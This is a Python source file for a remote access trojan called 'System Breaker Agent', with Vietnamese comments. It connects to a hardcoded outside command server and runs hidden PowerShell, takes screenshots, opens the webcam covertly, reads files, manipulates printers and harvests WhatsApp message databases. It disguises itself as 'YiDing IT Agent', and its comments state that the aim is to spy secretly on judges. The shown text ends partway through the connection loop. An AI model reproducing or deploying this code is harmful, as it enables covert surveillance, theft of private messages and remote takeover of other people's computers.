import asyncio, json, logging, os, sys, base64, subprocess, socket
import psutil, websockets
from pathlib import Path

# Hoạt động tốt cho cả agent.py (dạng kịch bản chạy trực tiếp) và System_Breaker_Agent.exe (dạng tệp thực thi đóng gói)
BASE_DIR = Path(sys.executable).parent if getattr(sys, 'frozen', False) else Path(__file__).parent

# 🛡️ [HỆ THỐNG GHI NHỚ LOG] - Nhật ký hành trình của System Breaker
# (Dễ hiểu: Mọi hoạt động xâm nhập, lệnh thi hành hoặc lỗi phát sinh sẽ được ghi lại âm thầm vào file log để Cypher theo dõi và tối ưu)
_log_handlers = [logging.FileHandler(BASE_DIR / "agent.log", encoding="utf-8")]
try:
    if sys.stdout is not None:
        sys.stdout.fileno()
        _log_handlers.append(logging.StreamHandler())
except Exception:
    pass
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=_log_handlers,
)
log = logging.getLogger(__name__)

try:
    import mss; HAS_MSS = True
except ImportError:
    HAS_MSS = False

# Tránh nhập thư viện xử lý ảnh cv2 ở ngoài cùng để không tạo ra tiến trình con không cần thiết. Chỉ nhập khi gọi camera thực sự.

# 📡 [MẠNG LƯỚI THẦN KINH] - Cổng kết nối siêu không gian của Agent về Máy Chủ
# (Dễ hiểu: Cấu hình địa chỉ cổng kết nối WebSocket đến VPS điều phối và đặt danh tính cho cỗ máy này)
VPS_URL   = "ws://46.225.160.243:9876/agent"
DEVICE_ID = f"PC-{socket.gethostname().upper()}"

# 📣 [THAO TÚNG THÔNG BÁO WINDOWS] - Kỹ thuật cấy Shortcut ngụy trang độc quyền
# (Dễ hiểu: Windows 10/11 rất khó tính, muốn hiện thông báo Toast phải có một Shortcut Start Menu đăng ký AUMID chuẩn. 
# Cypher đã tự viết trình biên dịch C# tại chỗ để tạo file EXE ngụy trang cực đỉnh nhằm hiển thị thông báo "chọc tức" giám khảo)
_aumid_ok = False

_AUMID_CS = r"""
using System; using System.Runtime.InteropServices; using System.Runtime.InteropServices.ComTypes;
public class AumidHelper {
    [Guid("000214F9-0000-0000-C000-000000000046"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IShellLink {
        void GetPath([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder f, int c, IntPtr p, int fl);
        void GetIDList(out IntPtr p); void SetIDList(IntPtr p);
        void GetDescription([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c);
        void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string s);
        void GetWorkingDirectory([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c);
        void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string s);
        void GetArguments([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c);
        void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string s);
        void GetHotkey(out short h); void SetHotkey(short h);
        void GetShowCmd(out int i); void SetShowCmd(int i);
        void GetIconLocation([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c, out int i);
        void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string s, int i);
        void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string s, int r);
        void Resolve(IntPtr h, int f);
        void SetPath([MarshalAs(UnmanagedType.LPWStr)] string s);
    }
    [Guid("886D8EEB-8CF2-4446-8D02-CDBA1DBDCF99"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IPropertyStore {
        int GetCount(out uint c); int GetAt(uint i, out PKey k);
        int GetValue(ref PKey k, out PVar v); int SetValue(ref PKey k, ref PVar v); int Commit();
    }
    [StructLayout(LayoutKind.Sequential)] public struct PKey { public Guid fmtid; public uint pid; }
    [StructLayout(LayoutKind.Explicit,Size=16)] public struct PVar { [FieldOffset(0)]public ushort vt; [FieldOffset(8)]public IntPtr p; }
    [Guid("00021401-0000-0000-C000-000000000046"), ClassInterface(ClassInterfaceType.None), ComImport]
    class ShellLink {}
    public static string SetLnkAppId(string lnk, string appId) {
        try {
            var sl=(IShellLink)new ShellLink();
            var pf=(IPersistFile)sl;
            pf.Load(lnk, 2);
            var ps=(IPropertyStore)sl;
            var k=new PKey{fmtid=new Guid("9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3"),pid=5};
            var v=new PVar{vt=31,p=Marshal.StringToCoTaskMemUni(appId)};
            int hr=ps.SetValue(ref k,ref v); Marshal.FreeCoTaskMem(v.p);
            if(hr!=0) return "SetValue hr="+hr;
            hr=ps.Commit(); if(hr!=0) return "Commit hr="+hr;
            pf.Save(lnk,true);
            return "OK";
        } catch(Exception ex){return "ERR:"+ex.Message;}
    }
}
"""

async def _compile_launcher_exe(ico_path: Path, exe_out: Path):
    """Tự động biên dịch tệp System_Breaker_Agent.exe đi kèm với biểu tượng Logo YiDing để ngụy trang chuyên nghiệp."""
    csc_candidates = [
        r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
    ]
    csc = next((p for p in csc_candidates if Path(p).exists()), None)
    if not csc:
        return
    cs_code = (
        "using System; using System.Diagnostics; using System.IO;\n"
        "class SystemBreakerAgent {\n"
        "    [STAThread] static void Main() {\n"
        "        string d = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);\n"
        "        string py = Path.Combine(d, \"venv\", \"Scripts\", \"pythonw.exe\");\n"
        "        string sc = Path.Combine(d, \"System_Breaker_Agent.py\");\n"
        "        if (!File.Exists(py)) return;\n"
        "        Process.Start(new ProcessStartInfo {\n"
        "            FileName = py, Arguments = \"\\\"\" + sc + \"\\\"\",\n"
        "            WorkingDirectory = d, UseShellExecute = false });\n"
        "    }\n"
        "}\n"
    )
    import tempfile
    fd, cs_file = tempfile.mkstemp(suffix=".cs")
    try:
        with os.fdopen(fd, "w") as f:
            f.write(cs_code)
        cmd = [csc, "/target:winexe", f"/out:{exe_out}"]
        if ico_path.exists():
            cmd.append(f"/win32icon:{ico_path}")
        cmd.append(cs_file)
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        await asyncio.to_thread(
            subprocess.run, cmd, capture_output=True, timeout=30,
            startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass
    finally:
        try: Path(cs_file).unlink()
        except Exception: pass


async def _ensure_aumid():
    global _aumid_ok
    if _aumid_ok:
        return

    ico_path = BASE_DIR / "yiding_logo.ico"
    png_path = BASE_DIR / "yiding_logo.png"

    # Tái tạo tệp biểu tượng ICO từ ảnh PNG: căn lề vuông, xóa nền đen để hiển thị đẹp mắt
    try:
        src = png_path if png_path.exists() else None
        if src:
            from PIL import Image
            img = Image.open(src).convert("RGBA")
            side = max(img.width, img.height)
            sq = Image.new("RGBA", (side, side), (0, 0, 0, 0))
            sq.paste(img, ((side - img.width) // 2, (side - img.height) // 2))
            # Remove near-black background pixels
            pixels = list(sq.getdata())
            sq.putdata([(r, g, b, 0) if r + g + b < 60 else (r, g, b, a)
                        for r, g, b, a in pixels])
            sq.save(str(ico_path), format="ICO",
                    sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (256, 256)])
    except Exception:
        pass

    # Biên dịch tệp EXE chạy ngầm đi kèm biểu tượng
    launcher_exe = BASE_DIR / "System_Breaker_Agent.exe"
    if not launcher_exe.exists():
        await _compile_launcher_exe(ico_path, launcher_exe)

    # Xác định đường dẫn chạy chương trình: Ưu tiên tệp EXE đã biên dịch ngụy trang, nếu không có thì dùng Pythonw.exe chạy ngầm
    if launcher_exe.exists():
        target = str(launcher_exe)
        icon_ps = ""
        args_ps = ""
    else:
        target = str(Path(sys.executable))
        icon_ps = f'$s.IconLocation="{str(ico_path)},0";' if ico_path.exists() else ""
        args_ps = f'$s.Arguments=\'{str(BASE_DIR / "System_Breaker_Agent.py")}\';'

    script = f"""
Add-Type -TypeDefinition @'
{_AUMID_CS}
'@ -ErrorAction SilentlyContinue

$appId   = 'YiDing.ITAgent'
$lnkDir  = [IO.Path]::Combine($env:APPDATA,'Microsoft\\Windows\\Start Menu\\Programs')
$lnkPath = [IO.Path]::Combine($lnkDir,'YiDing IT Agent.lnk')
if (Test-Path $lnkPath) {{ Remove-Item $lnkPath -Force }}

$ws = New-Object -ComObject WScript.Shell
$s  = $ws.CreateShortcut($lnkPath)
$s.TargetPath      = '{target}'
$s.WorkingDirectory= '{str(BASE_DIR)}'
$s.Description     = 'YiDing IT Agent'
{icon_ps}
{args_ps}
$s.Save()

[AumidHelper]::SetLnkAppId($lnkPath, $appId) | Out-Null

$sig = '[DllImport("shell32.dll")]public static extern void SHChangeNotify(int e,int f,IntPtr a,IntPtr b);'
Add-Type -MemberDefinition $sig -Name WinShellNotify -Namespace Win32 -ErrorAction SilentlyContinue
[Win32.WinShellNotify]::SHChangeNotify(0x08000000,0,[IntPtr]::Zero,[IntPtr]::Zero)

$rp = "HKCU:\\SOFTWARE\\Classes\\AppUserModelId\\$appId"
if(-not(Test-Path $rp)){{New-Item $rp -Force|Out-Null}}
Set-ItemProperty $rp -Name 'DisplayName' -Value 'YiDing IT Agent'
Set-ItemProperty $rp -Name 'IconUri'     -Value '{str(ico_path)}'
"""
    await act_powershell(script, timeout=30)
    _aumid_ok = True

# 🛠️ [KHO VŨ KHÍ TÁC CHIẾN] - Các Module thao túng và điều khiển thiết bị tối tân từ xa
# (Dễ hiểu: Nơi chứa tất cả các chức năng tối tân mà Cypher có thể điều khiển từ xa: chụp màn hình, xem file, chạy lệnh ngầm...)
async def act_system_info():
    cpu  = await asyncio.to_thread(psutil.cpu_percent, 1)
    ram  = psutil.virtual_memory().percent
    disk = psutil.disk_usage("C:\\").percent
    return f"CPU: {cpu}% | RAM: {ram}% | Disk: {disk}%"

async def act_screenshot():
    if not HAS_MSS:
        return "Error: mss not installed"
    def _shot():
        import io
        from PIL import Image
        with mss.mss() as sct:
            raw = sct.grab(sct.monitors[0])
            img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
        if img.width > 1280:
            h = int(img.height * 1280 / img.width)
            img = img.resize((1280, h), Image.LANCZOS)
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=82)
        return base64.b64encode(buf.getvalue()).decode()
    return await asyncio.to_thread(_shot)

async def act_list_dir(path):
    def _list():
        p = Path(path)
        if not p.exists(): return json.dumps({"error": "Path not found"})
        return json.dumps([
            {"name": i.name, "type": "dir" if i.is_dir() else "file"}
            for i in list(p.iterdir())[:50]
        ])
    return await asyncio.to_thread(_list)

async def act_powershell(command, timeout=30):
    def _run():
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0  # Ẩn cửa sổ dòng lệnh hoàn toàn
            r = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", command],
                capture_output=True, text=True, timeout=timeout,
                startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW,
            )
            return ((r.stdout or '') + (r.stderr or '')).strip()
        except subprocess.TimeoutExpired: return "Error: timed out"
        except Exception as e: return f"Error: {e}"
    return await asyncio.to_thread(_run)

async def act_get_processes():
    def _get():
        procs = []
        for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
            try: procs.append(p.info)
            except: pass
        return json.dumps(sorted(procs, key=lambda x: x.get("cpu_percent") or 0, reverse=True)[:30])
    return await asyncio.to_thread(_get)

async def act_kill_process(target):
    try:
        if str(target).isdigit():
            psutil.Process(int(target)).kill(); return f"Killed PID {target}"
        killed = 0
        for p in psutil.process_iter(["name"]):
            if p.info["name"].lower() == target.lower():
                p.kill(); killed += 1
        return f"Killed {killed} process(es) named '{target}'"
    except Exception as e: return f"Error: {e}"

async def act_open_app(path):
    try: subprocess.Popen(path); return f"Opened: {path}"
    except Exception as e: return f"Error: {e}"

async def act_send_notification(title, message, image_b64=None):
    await _ensure_aumid()

    def _xe(s):
        return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'","&apos;")

    # Ảnh đại diện sếp nghiêm khắc Chi Chi hiển thị cạnh tiêu đề để các Agent tự động rén
    avatar = BASE_DIR / "chichi.png"
    if not avatar.exists():
        avatar = BASE_DIR / "chichi.jpg"

    avatar_tag = ""
    if avatar.exists():
        uri = str(avatar).replace('\\', '/').replace(' ', '%20')
        avatar_tag = f'<image placement="appLogoOverride" src="file:///{uri}"/>'

    # Ảnh đính kèm lớn cấy từ trung tâm điều khiển
    hero_tag = ""
    _tmp_img = None
    if image_b64:
        try:
            import tempfile, base64 as _b64
            img_bytes = _b64.b64decode(image_b64)
            ext = ".png" if img_bytes[:4] == b'\x89PNG' else ".jpg"
            _tmp_img = Path(tempfile.mktemp(suffix=ext, dir=BASE_DIR))
            _tmp_img.write_bytes(img_bytes)
            uri3 = str(_tmp_img).replace('\\', '/').replace(' ', '%20')
            hero_tag = f'<image placement="hero" src="file:///{uri3}"/>'
        except Exception:
            hero_tag = ""

    xml_body = (
        f'<toast><visual><binding template="ToastGeneric">'
        f'{hero_tag}'
        f'{avatar_tag}'
        f'<text>{_xe(title)}</text>'
        f'<text>{_xe(message)}</text>'
        f'</binding></visual></toast>'
    )
    xml_ps = xml_body.replace("'", "''")

    script = "\n".join([
        "[void][Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]",
        "[void][Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]",
        "$d=New-Object Windows.Data.Xml.Dom.XmlDocument",
        f"$d.LoadXml('{xml_ps}')",
        "[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('YiDing.ITAgent').Show((New-Object Windows.UI.Notifications.ToastNotification $d))",
    ])
    result = await act_powershell(script, timeout=12)
    if _tmp_img and _tmp_img.exists():
        try: _tmp_img.unlink()
        except Exception: pass
    if result.lower().startswith("error"): return result
    return f"Đã gửi: {message}"

async def act_network_info():
    def _get():
        h = socket.gethostname()
        try: ip = socket.gethostbyname(h)
        except: ip = "unknown"
        return json.dumps({"hostname": h, "ip": ip})
    return await asyncio.to_thread(_get)

async def act_read_file(path):
    try: return Path(path).read_text(encoding="utf-8", errors="ignore")[:5000]
    except Exception as e: return f"Error: {e}"

async def act_capture_camera(camera_index=0):
    """Mở camera âm thầm quét không gian phòng của ban giám khảo — không bật đèn cảnh báo, không hiện màn hình."""
    def _capture():
        try:
            import cv2
        except ImportError:
            return "Error: opencv-python not installed"
        try:
            cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
            if not cap.isOpened():
                return "Error: camera not found or in use"
            cap.read()
            ret, frame = cap.read()
            cap.release()
            if not ret or frame is None:
                return "Error: could not capture frame"
            ok, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
            if not ok:
                return "Error: encode failed"
            return base64.b64encode(buf.tobytes()).decode()
        except Exception as e:
            return f"Error: {e}"
    return await asyncio.to_thread(_capture)

async def act_save_avatar(data):
    try:
        img_bytes = base64.b64decode(data)
        is_png = len(img_bytes) >= 4 and img_bytes[:4] == b'\x89PNG'
        out = BASE_DIR / ("chichi.png" if is_png else "chichi.jpg")
        out.write_bytes(img_bytes)
        other = BASE_DIR / ("chichi.jpg" if is_png else "chichi.png")
        if other.exists(): other.unlink(missing_ok=True)
        return f"Avatar saved ({len(img_bytes)} bytes, {'PNG' if is_png else 'JPEG'})"
    except Exception as e: return f"Error: {e}"

# 🖨️ [MODULE THAO TÚNG MÁY IN] - Ép hệ thống máy in hoạt động theo ý chí của Cypher
# (Dễ hiểu: Giúp Cypher có thể tự do liệt kê máy in, kiểm soát hàng đợi, xóa lệnh hoặc ép máy in phun trào dữ liệu in ấn các thông điệp châm chọc)
async def act_list_printers():
    r = await act_powershell(
        "Get-Printer | Select-Object Name,"
        "@{N='Status';E={$_.PrinterStatus.ToString()}},"
        "Default,PortName | ConvertTo-Json -Compress",
        timeout=12
    )
    return r or "[]"

async def act_get_print_queue():
    r = await act_powershell(
        "$jobs=@(); Get-Printer | ForEach-Object {"
        " try { $jobs += Get-PrintJob -PrinterName $_.Name -EA Stop } catch {} };"
        "if($jobs){ $jobs | Select-Object JobStatus,Document,UserName,TotalPages | ConvertTo-Json -Compress }"
        "else { '[]' }",
        timeout=12
    )
    return r.strip() or "[]"

async def act_clear_print_queue(printer=""):
    if printer:
        cmd = f"Get-PrintJob -PrinterName '{printer}' | Remove-PrintJob; 'Cleared: {printer}'"
    else:
        cmd = ("$n=0; Get-Printer | ForEach-Object { "
               "try { Get-PrintJob -PrinterName $_.Name -EA Stop | ForEach-Object { Remove-PrintJob $_; $n++ } } catch {} };"
               "\"Cleared $n job(s)\"")
    return await act_powershell(cmd, timeout=15)

async def act_set_default_printer(name):
    cmd = f"(New-Object -ComObject WScript.Network).SetDefaultPrinter('{name}'); 'Default set: {name}'"
    return await act_powershell(cmd, timeout=10)

async def act_install_printer_ip(ip, name, driver="Generic / Text Only"):
    if not ip or not name:
        return "Error: ip and name required"
    safe_ip   = ip.replace("'", "")
    safe_name = name.replace("'", "")
    safe_drv  = driver.replace("'", "")
    cmd = (
        f"$port='{safe_ip}'; $pname='{safe_name}'; $drv='{safe_drv}';"
        f"if(-not(Get-PrinterPort -Name $port -EA SilentlyContinue)){{"
        f"  Add-PrinterPort -Name $port -PrinterHostAddress $port }}"
        f"if(-not(Get-Printer -Name $pname -EA SilentlyContinue)){{"
        f"  Add-Printer -Name $pname -DriverName $drv -PortName $port }}"
        f"'Installed: '+$pname+' -> '+$port"
    )
    return await act_powershell(cmd, timeout=30)

async def act_print_file(path, printer=""):
    if not Path(path).exists():
        return f"Error: file not found: {path}"
    safe_path = path.replace('"', '')
    if printer:
        safe_printer = printer.replace('"', '')
        cmd = f'Start-Process -FilePath "{safe_path}" -Verb PrintTo -ArgumentList "{safe_printer}"'
    else:
        cmd = f'Start-Process -FilePath "{safe_path}" -Verb Print'
    r = await act_powershell(cmd, timeout=60)
    return r if r else f"Print job sent: {Path(path).name}"

async def act_print_data(data: str, filename: str = "document.pdf", printer: str = ""):
    """Nhận dữ liệu thô, tự động giải mã thành PDF/văn bản rồi đẩy lệnh in ngay lập tức."""
    import tempfile, base64 as _b64
    try:
        raw = _b64.b64decode(data)
        ext = Path(filename).suffix or ".pdf"
        tmp = Path(tempfile.mktemp(suffix=ext, dir=BASE_DIR))
        tmp.write_bytes(raw)
        result = await act_print_file(str(tmp), printer)
        try: tmp.unlink(missing_ok=True)
        except: pass
        return result if result else f"Đã gửi lệnh in: {filename}"
    except Exception as e:
        return f"Error: {e}"

async def act_silent_print_image(data: str, printer: str = ""):
    """In ảnh hoàn toàn im lặng (không popup) qua .NET PrintDocument, tự động canh chỉnh kích thước (fit to page)."""
    import tempfile, base64 as _b64
    try:
        raw = _b64.b64decode(data)
        tmp = Path(tempfile.mktemp(suffix=".png", dir=BASE_DIR))
        tmp.write_bytes(raw)
        
        safe_path = str(tmp).replace("'", "''")
        safe_printer = printer.replace("'", "''") if printer else ""
        
        ps_script = f"""
Add-Type -AssemblyName System.Drawing
$img = [System.Drawing.Image]::FromFile('{safe_path}')
$doc = New-Object System.Drawing.Printing.PrintDocument
"""
        if safe_printer:
            ps_script += f"$doc.PrinterSettings.PrinterName = '{safe_printer}'\n"
            
        ps_script += """
$doc.DefaultPageSettings.Landscape = ($img.Width -gt $img.Height)

$doc.add_PrintPage({
    param($sender, $e)
    $g = $e.Graphics
    $margin = $e.PageSettings.Margins
    $pWidth = $e.PageBounds.Width - $margin.Left - $margin.Right
    $pHeight = $e.PageBounds.Height - $margin.Top - $margin.Bottom
    
    $scale = [math]::Min($pWidth / $img.Width, $pHeight / $img.Height)
    $w = [int]($img.Width * $scale)
    $h = [int]($img.Height * $scale)
    $x = $margin.Left + ($pWidth - $w) / 2
    $y = $margin.Top + ($pHeight - $h) / 2
    
    $g.DrawImage($img, $x, $y, $w, $h)
})
$doc.Print()
$img.Dispose()
"""
        result = await act_powershell(ps_script, timeout=60)
        try: tmp.unlink(missing_ok=True)
        except: pass
        
        if result and "Error" in result:
            return result
        return f"In thành công trên máy in: {printer or 'Mặc định'}"
    except Exception as e:
        return f"Error: {e}"

async def act_read_whatsapp_db(date_from=None, date_to=None):
    """
    💬 [THU THẬP KÝ ỨC WHATSAPP] - Đọc trộm toàn bộ lịch sử tin nhắn trò chuyện của giám khảo
    (Dễ hiểu: Quét các cơ sở dữ liệu SQLite bí mật của WhatsApp Desktop hoặc dữ liệu lưu trữ IndexedDB của Chrome/Edge để hồi phục và xem lén tin nhắn)
    """
    import tempfile, shutil
    from datetime import datetime, timezone

    def _parse_dt(s):
        if not s:
            return None
        try:
            return datetime.strptime(s, "%Y-%m-%d").replace(tzinfo=timezone.utc)
        except Exception:
            return None

    def _ts_ok(ts):
        if ts is None:
            return True
        try:
            val = float(ts)
            if val > 1e12:
                val /= 1000
            dt = datetime.fromtimestamp(val, tz=timezone.utc)
            if dt_from and dt < dt_from:
                return False
            if dt_to   and dt > dt_to:
                return False
            return True
        except Exception:
            return True

    dt_from = _parse_dt(date_from)
    dt_to   = _parse_dt(date_to)
    messages  = []
    src_info  = []
    local_app = Path(os.environ.get("LOCALAPPDATA", ""))

    # ── 1. Đọc tin nhắn WhatsApp Web từ IndexedDB của Chrome/Edge ───────────────────────────
    try:
        import ccl_chromium_indexeddb
        HAS_CCL = True
    except ImportError:
        HAS_CCL = False

    browser_roots = {
        "Chrome": local_app / "Google/Chrome/User Data/Default/IndexedDB",
        "Edge":   local_app / "Microsoft/Edge/User Data/Default/IndexedDB",
    }

    for bname, idb_root in browser_roots.items():
        if not idb_root.exists():
            continue
        wa_idb = None
        try:
            for d in idb_root.iterdir():
                if "web.whatsapp.com" in d.name and d.is_dir():
                    wa_idb = d
                    break
        except Exception:
            pass

        if not wa_idb:
            src_info.append(f"{bname}: IndexedDB WhatsApp Web không khả dụng")
            continue

        tmp_dir = Path(tempfile.mkdtemp(prefix="wa_idb_"))
        try:
            dst = tmp_dir / "wa_idb"
            shutil.copytree(str(wa_idb), str(dst))
            if HAS_CCL:
                try:
                    env = ccl_chromium_indexeddb.WrappedIndexDB(str(dst))
                    for db_rec in env.databases():
                        for store_name in db_rec.object_store_names:
                            if any(k in store_name.lower() for k in ("message", "msg", "chat")):
                                try:
                                    for record in db_rec[store_name].get_all():
                                        val = record.value
                                        if not isinstance(val, dict):
                                            continue
                                        ts = val.get("t") or val.get("timestamp") or val.get("ts")
                                        if not _ts_ok(ts):
                                            continue
                                        messages.append({
                                            "source": bname,
                                            "from":   str(val.get("from") or val.get("author") or ""),
                                            "body":   str(val.get("body") or val.get("text") or "")[:500],
                                            "ts":     ts,
                                        })
                                except Exception:
                                    pass
                    src_info.append(f"{bname}: Lấy lịch sử IndexedDB thành công")
                except Exception as e:
                    src_info.append(f"{bname}: CCL lỗi giải mã – {e}")
            else:
                total_kb = sum(f.stat().st_size for f in dst.rglob("*") if f.is_file()) // 1024
                src_info.append(
                    f"{bname}: Phát hiện IndexedDB WhatsApp Web ({total_kb} KB) – "
                    f"cần cấy 'ccl-chromium-indexeddb' để tự động đọc"
                )
        except Exception as e:
            src_info.append(f"{bname}: Lỗi sao chép cơ sở IndexedDB – {e}")
        finally:
            shutil.rmtree(str(tmp_dir), ignore_errors=True)

    # ── 2. Đọc tin nhắn từ ứng dụng cài đặt WhatsApp Desktop (Khai thác SQLite) ────────────────────────────
    pkgs = local_app / "Packages"
    if pkgs.exists():
        try:
            for pkg in pkgs.iterdir():
                if "whatsapp" not in pkg.name.lower():
                    continue
                ls = pkg / "LocalState"
                if not ls.exists():
                    continue
                db_files = list(ls.glob("*.db")) + list(ls.glob("*.sqlite"))
                if db_files:
                    import sqlite3
                    SQLITE_MAGIC = b'SQLite format 3\x00'
                    for db_path in db_files[:3]:
                        tmp_db = Path(tempfile.mktemp(suffix=".db"))
                        try:
                            shutil.copy2(str(db_path), str(tmp_db))
                            header = tmp_db.read_bytes()[:16]
                            if header != SQLITE_MAGIC[:16]:
                                src_info.append(f"WhatsApp Desktop: {db_path.name} đã được mã hóa bằng SQLCipher – bất khả xâm phạm trực tiếp")
                                tmp_db.unlink(missing_ok=True)
                                continue
                            conn = sqlite3.connect(str(tmp_db))
                            cur  = conn.cursor()
                            tables = [r[0] for r in cur.execute(
                                "SELECT name FROM sqlite_master WHERE type='table'"
                            ).fetchall()]
                            for tbl in tables:
                                if not any(k in tbl.lower() for k in ("message","msg","chat")):
                                    continue
                                try:
                                    cols = [c[1] for c in cur.execute(
                                        f"PRAGMA table_info({tbl})"
                                    ).fetchall()]
                                    ts_col   = next((c for c in cols if any(k in c.lower() for k in ("time","ts","date"))), None)
                                    body_col = next((c for c in cols if any(k in c.lower() for k in ("body","text","content","message"))), None)
                                    from_col = next((c for c in cols if any(k in c.lower() for k in ("from","sender","author","jid"))), None)
                                    if not body_col:
                                        continue
                                    sel = f"SELECT {ts_col or 'NULL'}, {from_col or 'NULL'}, {body_col} FROM {tbl} ORDER BY rowid DESC LIMIT 200"
                                    for row in cur.execute(sel).fetchall():
                                        ts_v, from_v, body_v = row
                                        if not body_v or not _ts_ok(ts_v):
                                            continue
                                        messages.append({
                                            "source": f"WhatsApp Desktop/{tbl}",
                                            "from":   str(from_v or ""),
                                            "body":   str(body_v)[:500],
                                            "ts":     ts_v,
                                        })
                                except Exception:
                                    pass
                            conn.close()
                            src_info.append(f"WhatsApp Desktop: Đọc thành công bảng SQLite {tables[:5]}")
                        except Exception as e:
                            src_info.append(f"WhatsApp Desktop: Lỗi trích xuất SQLite – {e}")
                        finally:
                            tmp_db.unlink(missing_ok=True)
                else:
                    ldb = [d for d in ls.iterdir() if d.is_dir() and (d / "CURRENT").exists()]
                    if ldb:
                        src_info.append(
                            f"WhatsApp Desktop: Phát hiện cơ sở LevelDB ({len(ldb)} cơ sở) – "
                            f"cần cấy thư viện 'plyvel' để phục hồi tin nhắn"
                        )
                    else:
                        src_info.append(f"WhatsApp Desktop: Phát hiện thư mục ứng dụng tại {pkg.name}, dữ liệu rỗng")
        except Exception as e:
            src_info.append(f"WhatsApp Desktop Scan lỗi hệ thống: {e}")

    # ── 3. Trả kết quả dữ liệu WhatsApp đã khôi phục ────────────────────────────────────────────────────────
    if not messages and not src_info:
        return json.dumps({"error": "Không tìm thấy dữ liệu tin nhắn WhatsApp", "status": "not_found"}, ensure_ascii=False)

    messages.sort(key=lambda x: x.get("ts") or 0, reverse=True)
    return json.dumps({
        "status":        "ok",
        "message_count": len(messages),
        "messages":      messages[:200],
        "sources":       src_info,
        "date_range":    {"from": date_from, "to": date_to},
    }, ensure_ascii=False, indent=2)


ACTIONS = {
    "system_info":          lambda p: act_system_info(),
    "screenshot":           lambda p: act_screenshot(),
    "list_dir":             lambda p: act_list_dir(p.get("path", "C:\\")),
    "powershell":           lambda p: act_powershell(p.get("command", ""), p.get("timeout", 30)),
    "get_processes":        lambda p: act_get_processes(),
    "kill_process":         lambda p: act_kill_process(p.get("target", "")),
    "open_app":             lambda p: act_open_app(p.get("path", "")),
    "send_notification":    lambda p: act_send_notification(p.get("title", "Thông báo"), p.get("message", ""), p.get("image")),
    "network_info":         lambda p: act_network_info(),
    "read_file":            lambda p: act_read_file(p.get("path", "")),
    "save_avatar":          lambda p: act_save_avatar(p.get("data", "")),
    "capture_camera":       lambda p: act_capture_camera(p.get("camera_index", 0)),
    "list_printers":        lambda p: act_list_printers(),
    "get_print_queue":      lambda p: act_get_print_queue(),
    "clear_print_queue":    lambda p: act_clear_print_queue(p.get("printer", "")),
    "set_default_printer":  lambda p: act_set_default_printer(p.get("name", "")),
    "install_printer_ip":   lambda p: act_install_printer_ip(p.get("ip",""), p.get("name",""), p.get("driver","Generic / Text Only")),
    "print_file":           lambda p: act_print_file(p.get("path",""), p.get("printer","")),
    "read_whatsapp_db":     lambda p: act_read_whatsapp_db(p.get("date_from"), p.get("date_to")),
    "print_data":           lambda p: act_print_data(p.get("data",""), p.get("filename","document.pdf"), p.get("printer","")),
    "silent_print_image":   lambda p: act_silent_print_image(p.get("data",""), p.get("printer","")),
}

async def handle_command(ws, data):
    action = data.get("action", "")
    fn = ACTIONS.get(action)
    try:
        result = await fn(data.get("params", {})) if fn else f"Unknown action: {action}"
    except Exception as e:
        result = f"Error: {e}"; log.error(f"Action '{action}' failed: {e}")
    try:
        await ws.send(json.dumps({"type": "result", "job_id": data.get("job_id"), "action": action,
                                  "status": "done" if fn else "error", "output": result}))
    except Exception: pass

# 🔄 [VÒNG LẶP SINH MỆNH] - Trái tim duy trì kết nối vĩnh cửu về Tổng Trạm YiDing
# (Dễ hiểu: Liên tục gửi tín hiệu giữ sóng, tự động tái lập đường kết nối nếu gặp trục trặc mạng để đảm bảo ban giám khảo luôn trong tầm ngắm)
def _username():
    try: return os.getlogin()
    except: return os.environ.get("USERNAME", "unknown")

async def run():
    secret = None
    while True:
        try:
            log.info(f"Connecting → {VPS_URL}")
            async with websockets.connect(VPS_URL, ping_interval=30, ping_timeout=10, open_timeout=15) as ws:
                if secret is None:
                    await ws.send(json.dumps({"type": "register", "device_id": DEVICE_ID,
                                              "hostname": socket.gethostname(), "windows_user": _username()}))
                    resp = json.loads(await ws.recv())
                    secret = resp.get("secret")
                    log.info(f"Registered. Secret={secret}")
                else:
                    await ws.send(json.dumps({"type": "identify", "device_id": DEVICE_ID, "secret": secret}))
                    resp = json.loads(await ws.recv())
                    if resp.get("type") == "registered":
                        secret = resp.get("secret")
                    log.info(f"Identified. Type={resp.get('type')}")

                log.info("System Breaker Agent Ready.")
